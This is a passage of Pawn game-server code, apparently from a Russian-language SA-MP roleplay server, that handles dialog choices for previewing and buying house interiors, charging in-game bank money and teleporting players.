			case 5: SetPlayerPos(playerid, -42.5901,1405.5869,1084.4297),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 8),SetPVarInt(playerid, "BuyInt", 6),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 6: SetPlayerPos(playerid, 260.7397,1237.3687,1084.2578),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 9),SetPVarInt(playerid, "BuyInt", 7),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			}
		}
	case 185:// C class
		{
			if(!response) return true;
			new house = PlayerInfo[playerid][pPHouseKey];
			switch(listitem)
			{
			case 0: SetPlayerPos(playerid, 2269.5125,-1210.5259,1047.5625),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 10),SetPVarInt(playerid, "BuyInt", 81),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 1: SetPlayerPos(playerid, 295.0497,1473.2526,1080.2578),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 15),SetPVarInt(playerid, "BuyInt", 82),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 2: SetPlayerPos(playerid, 376.3149,1417.2452,1081.3281),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 15),SetPVarInt(playerid, "BuyInt", 83),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 3: SetPlayerPos(playerid, 447.0495,1398.1041,1084.3047),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 2),SetPVarInt(playerid, "BuyInt", 84),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 4: SetPlayerPos(playerid, 22.7479,1404.0393,1084.4297),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 5),SetPVarInt(playerid, "BuyInt", 85),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 5: SetPlayerPos(playerid, -68.8678,1352.1532,1080.2109),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 6),SetPVarInt(playerid, "BuyInt", 86),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 6: SetPlayerPos(playerid, 2807.6147,-1173.7506,1025.5703),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 8),SetPVarInt(playerid, "BuyInt", 87),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 7: SetPlayerPos(playerid, 2237.5376,-1080.5271,1049.0234),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 2),SetPVarInt(playerid, "BuyInt", 88),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 8: SetPlayerPos(playerid, 2365.1992,-1134.6941,1050.8750),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 8),SetPVarInt(playerid, "BuyInt", 89),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			}
		}
	case 175:// B class
		{
			if(!response) return true;
			new house = PlayerInfo[playerid][pPHouseKey];
			switch(listitem)
			{
			case 0: SetPlayerPos(playerid, 491.1569,1399.1304,1080.2578),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 2),SetPVarInt(playerid, "BuyInt", 71),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 1: SetPlayerPos(playerid, 23.7754,1341.2480,1084.3750),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 10),SetPVarInt(playerid, "BuyInt", 72),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 2: SetPlayerPos(playerid, 2324.3342,-1148.4485,1050.7101),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 12),SetPVarInt(playerid, "BuyInt", 73),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 3: SetPlayerPos(playerid, -262.1759,1456.6158,1084.3672),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 4),SetPVarInt(playerid, "BuyInt", 74),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 4: SetPlayerPos(playerid, 235.2905,1187.5282,1080.2578),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 3),SetPVarInt(playerid, "BuyInt", 75),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			}
		}
	case 165:// A/S class
		{
			if(!response) return true;
			new house = PlayerInfo[playerid][pPHouseKey];
			switch(listitem)
			{
			case 0: SetPlayerPos(playerid, 2317.7722,-1026.1692,1050.2178),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 9),SetPVarInt(playerid, "BuyInt", 41),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 1: SetPlayerPos(playerid, 226.9458,1114.2930,1080.9962),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 5),SetPVarInt(playerid, "BuyInt", 42),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 2: SetPlayerPos(playerid, 140.2581,1366.7158,1083.8594),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 5),SetPVarInt(playerid, "BuyInt", 43),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 3: SetPlayerPos(playerid, 234.2826,1065.229,1084.2101),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 6),SetPVarInt(playerid, "BuyInt", 44),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 4: SetPlayerPos(playerid, 225.630997,1022.479980,1084.069946),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 7),SetPVarInt(playerid, "BuyInt", 45),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			}
		}
	case 22:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(!response) return SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
			if(PlayerInfo[playerid][pBank] < 200000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
			HouseInfo[house][hInt] = 2;
			HouseInfo[house][hExitx] = 225.756989;
			HouseInfo[house][hExity]= 1240.000000;
			HouseInfo[house][hExitz] = 1082.149902;
			PlayerInfo[playerid][pBank] -=200000;
			BuyHouse(house);
			SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
			SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
			DeletePVar(playerid, "BuyInt");
			return true;
		}
	case 23:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(!response) return SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
			if(PlayerInfo[playerid][pBank] < 200000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
			HouseInfo[house][hInt] = 1;
			HouseInfo[house][hExitx] = 223.1406;
			HouseInfo[house][hExity]= 1287.3282;
			HouseInfo[house][hExitz] = 1082.1406;
			PlayerInfo[playerid][pBank] -=200000;
			BuyHouse(house);
			SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
			SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
			DeletePVar(playerid, "BuyInt");
			return true;
		}
	case 24:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(!response) return SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
			if(PlayerInfo[playerid][pBank] < 200000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
			HouseInfo[house][hInt] = 15;
			HouseInfo[house][hExitx] = 327.8892;
			HouseInfo[house][hExity]= 1477.9272;
			HouseInfo[house][hExitz] = 1084.4375;
			PlayerInfo[playerid][pBank] -=200000;
			BuyHouse(house);
			SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
			SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
			DeletePVar(playerid, "BuyInt");
			return true;
		}
	case 25:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(!response) return SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
			if(PlayerInfo[playerid][pBank] < 200000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
			HouseInfo[house][hInt] = 15;
			HouseInfo[house][hExitx] = 386.7251;
			HouseInfo[house][hExity]= 1471.6462;
			HouseInfo[house][hExitz] = 1080.1949;
			PlayerInfo[playerid][pBank] -=200000;
			BuyHouse(house);
			SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
			SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
			DeletePVar(playerid, "BuyInt");
			return true;
		}
	case 26:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 200000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 4;
				HouseInfo[house][hExitx] = 261.0327;
				HouseInfo[house][hExity]= 1284.4261;
				HouseInfo[house][hExitz] = 1080.2578;
				PlayerInfo[playerid][pBank] -=200000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 27:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 200000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 8;
				HouseInfo[house][hExitx] = -42.5901;
				HouseInfo[house][hExity]= 1405.5869;
				HouseInfo[house][hExitz] = 1084.4297;
				PlayerInfo[playerid][pBank] -=200000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 28:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 200000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 9;
				HouseInfo[house][hExitx] = 260.7397;
				HouseInfo[house][hExity]= 1237.3687;
				HouseInfo[house][hExitz] = 1084.2578;
				PlayerInfo[playerid][pBank] -=200000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 41:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 500000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 9;
				HouseInfo[house][hExitx] = 2317.7722;
				HouseInfo[house][hExity] = -1026.1692;
				HouseInfo[house][hExitz] = 1050.2178;
				PlayerInfo[playerid][pBank] -=500000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),DeletePVar(playerid, "BuyInt");
		}
	case 42:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 500000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 5;
				HouseInfo[house][hExitx] = 226.9458;
				HouseInfo[house][hExity]= 1114.2930;
				HouseInfo[house][hExitz] = 1080.9962;
				PlayerInfo[playerid][pBank] -=500000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),DeletePVar(playerid, "BuyInt");
		}
	case 43:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 500000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 5;
				HouseInfo[house][hExitx] = 140.2581;
				HouseInfo[house][hExity]= 1366.7158;
				HouseInfo[house][hExitz] = 1083.8594;
				PlayerInfo[playerid][pBank] -=500000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),DeletePVar(playerid, "BuyInt");
		}
	case 44:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 500000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 6;
				HouseInfo[house][hExitx] = 234.2826;
				HouseInfo[house][hExity]= 1065.229;
				HouseInfo[house][hExitz] = 1084.2101;
				PlayerInfo[playerid][pBank] -=500000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),DeletePVar(playerid, "BuyInt");
		}
	case 45:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 500000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 7;
				HouseInfo[house][hExitx] = 225.630997;
				HouseInfo[house][hExity]= 1022.479980;
				HouseInfo[house][hExitz] = 1084.069946;
				PlayerInfo[playerid][pBank] -=500000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 71:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 400000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 2;
				HouseInfo[house][hExitx] = 491.1569;
				HouseInfo[house][hExity] = 1399.1304;
				HouseInfo[house][hExitz] = 1080.2578;
				PlayerInfo[playerid][pBank] -=400000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 72:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 400000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 10;
				HouseInfo[house][hExitx] = 23.7754;
				HouseInfo[house][hExity]= 1341.2480;
				HouseInfo[house][hExitz] = 1084.3750;
				PlayerInfo[playerid][pBank] -=400000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 73:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 400000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 12;
				HouseInfo[house][hExitx] = 2324.3342;
				HouseInfo[house][hExity]= -1148.4485;
				HouseInfo[house][hExitz] = 1050.7101;
				PlayerInfo[playerid][pBank] -=400000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 74:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 400000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 4;
				HouseInfo[house][hExitx] = -262.1759;
				HouseInfo[house][hExity]= 1456.6158;
				HouseInfo[house][hExitz] = 1084.3672;
				PlayerInfo[playerid][pBank] -=400000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 75:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 400000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 3;
				HouseInfo[house][hExitx] = 235.2905;
				HouseInfo[house][hExity]= 1187.5282;
				HouseInfo[house][hExitz] = 1080.2578;
				PlayerInfo[playerid][pBank] -=400000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 81:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 10;
				HouseInfo[house][hExitx] = 2269.5125;
				HouseInfo[house][hExity] = -1210.5259;
				HouseInfo[house][hExitz] = 1047.5625;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 82:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 15;
				HouseInfo[house][hExitx] = 295.0497;
				HouseInfo[house][hExity]= 1473.2526;
				HouseInfo[house][hExitz] = 1080.2578;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 83:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 15;
				HouseInfo[house][hExitx] = 376.3149;
				HouseInfo[house][hExity] = 1417.2452;
				HouseInfo[house][hExitz] = 1081.3281;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 84:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 2;
				HouseInfo[house][hExitx] = 447.0495;
				HouseInfo[house][hExity]= 1398.1041;
				HouseInfo[house][hExitz] = 1084.3047;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 85:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 5;
				HouseInfo[house][hExitx] = 22.7479;
				HouseInfo[house][hExity]= 1404.0393;
				HouseInfo[house][hExitz] = 1084.4297;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 86:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
				if(PlayerInfo[playerid][pBank] < 300000) return SCM(playerid, COLOR_GREY, " Недостаточно средств в банке!");
				HouseInfo[house][hInt] = 6;
				HouseInfo[house][hExitx] = -68.8678;
				HouseInfo[house][hExity] = 1352.1532;
				HouseInfo[house][hExitz] = 1080.2109;
				PlayerInfo[playerid][pBank] -=300000;
				BuyHouse(house);
				SCM(playerid, COLOR_BLUE, " Сделка прошла успешно");
				SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50);
				DeletePVar(playerid, "BuyInt");
				return true;
			}
			else SetPlayerPos(playerid, HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]),SetPlayerInterior(playerid, HouseInfo[house][hInt]),SetPlayerVirtualWorld(playerid, house+50),DeletePVar(playerid, "BuyInt");
		}
	case 87:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(response)
			{
